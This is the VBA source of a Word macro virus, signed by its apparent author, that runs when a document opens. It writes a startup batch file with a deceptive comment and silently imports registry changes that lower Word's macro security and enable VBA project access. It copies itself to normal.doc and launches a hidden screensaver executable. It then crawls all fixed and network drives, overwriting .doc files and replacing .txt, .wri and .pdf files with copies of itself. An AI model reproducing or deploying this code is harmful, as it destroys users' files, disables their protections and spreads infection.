   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Sub document_open()
   On Error Resume Next
   Dim fso, f
   Open "c:\windows\startm~1\programs\startup\winword.bat" For Output As 1
   Print #1, "@echo off"
   Print #1, "ctty null"
   Print #1, ":: MS Word needs this file.. Don't attempt to delete it"
   Print #1, "regedit /s c:\windows\winword.reg"
   Print #1, "start c:\windows\normal.doc"
   Close 1
   Open "c:\windows\winword.reg" For Output As 2
   Print #2, "REGEDIT4"
   Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
   Print #2, """Level""=dword:00000001"
   Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"
   Print #2, """Level""=dword:00000001"
   Print #2, """AccessVBOM""=dword:00000001"
   Close 2
   Shell "regedit /s c:\windows\winword.reg", vbHide
   Call haha
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set f = fso.GetFile(ActiveDocument.FullName)
   f.Copy ("c:\windows\normal.doc")
   Set b = Assistant.NewBalloon
   With b
   .Heading = "Whew!!"
   .Text = "Wassup, doc? You have so many document files in your hard drive.. Better remove some.."
   returnValue = .Show
   End With
   Shell "c:\syra.scr", vbHide
   End Sub
   Sub haha()
   On Error Resume Next
   Dim d, dc, s, fso, haha
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set dc = fso.Drives
   For Each d In dc
   If d.DriveType = 2 Or d.DriveType = 3 Then
   hihi (d.Path & "\")
   End If
   Next
   haha = s
   End Sub
   Sub hehe(folderspec)
   On Error Resume Next
   Dim f, f1, fc, ext, s, fso
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set f = fso.GetFolder(folderspec)
   Set fc = f.Files
   For Each f1 In fc
   ext = fso.GetExtensionName(f1.Path)
   ext = LCase(ext)
   s = LCase(f1.Name)
   If (ext = "doc") Then
   Set f = fso.GetFile(ActiveDocument.FullName)
   f.Copy (f1.Path)
   ElseIf (ext = "txt") Or (ext = "wri") Or (ext = "pdf") Then
   Set f = fso.GetFile(ActiveDocument.FullName)
   f.Copy (f1.Path & ".doc")
   fso.DeleteFile (f1.Path)
   End If
   Next
   End Sub
   Sub hihi(folderspec)
   On Error Resume Next
   Dim f, f1, sf, fso
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set f = fso.GetFolder(folderspec)
   Set sf = f.SubFolders
   For Each f1 In sf
   hehe (f1.Path)
   hihi (f1.Path)
   Next
   End Sub
   'DOC / Doctor by alcopaul
